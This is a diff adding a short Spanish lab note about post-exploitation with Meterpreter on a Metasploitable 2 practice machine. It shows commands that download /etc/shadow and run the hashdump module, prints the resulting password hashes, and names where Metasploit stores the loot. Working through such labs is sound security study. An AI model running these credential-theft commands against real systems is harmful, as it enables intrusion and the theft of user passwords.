@@ -1,0 +1,32 @@
+Una vez ya tenemos una sesion creada de meterpreter en nuestra maquina de Metasploitable 2, y somos root, podemos viajar por dentro de la maquina y descargarnos a nuestro ordenador lo que querámos usando el parametro download. 
+Además podemos usar un modulo hashdump que nos dará los archivos que contienen credenciales de los usuarios registrados en esta maquina. 
+
+Hay 2 maneras:
+Una sería descargarnos directamente la carpeta etc/shadow
+meterpreter > download /etc/shadow
+[*] Downloading: /etc/shadow -> /home/kali/shadow
+[*] Downloaded 1.24 KiB of 1.24 KiB (100.0%): /etc/shadow -> /home/kali/shadow
+[*] Completed  : /etc/shadow -> /home/kali/shadow
+
+Y la otra sería utilizar un modulo. 
+
+meterpreter > run post/linux/gather/hashdump 
+
+[+] root:$1$gIPGQ.Hm$fzMGzRq9sTZ7Q/dQWhUTx1:0:0:root:/root:/bin/bash
+[+] sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:3:3:sys:/dev:/bin/sh
+[+] klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:103:104::/home/klog:/bin/false
+[+] msfadmin:$1$ChI.NLaK$fd1mPyUmWm2bGYG/yoDjT/:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
+[+] postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+[+] user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:1001:1001:just a user,111,,:/home/user:/bin/bash
+[+] service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:1002:1002:,,,:/home/service:/bin/bash
+[+] leomessi:$1$rGitUHF.$GESggTYiA5v3Pn/CxuLyV/:1003:1003:,,,:/home/leomessi:/bin/bash
+[+] Unshadowed Password File: /root/.msf4/loot/20231218084452_default_10.0.2.11_linux.hashes_120721.txt
+
+
+Toda la información que vayamos recabando de metasploit la podemos encontrar en la base de datos que genera al iniciar. Para buscar los datos podemos usar comandos como:
+services
+notes
+hosts
+
+Tambien podemos encontrar toda la informacion que vamos recabando en nuestra maquina, entrando como root ya que usamos este usuario para abrir metasploit. Suelen estar en la carpeta .msf4/loot/
+
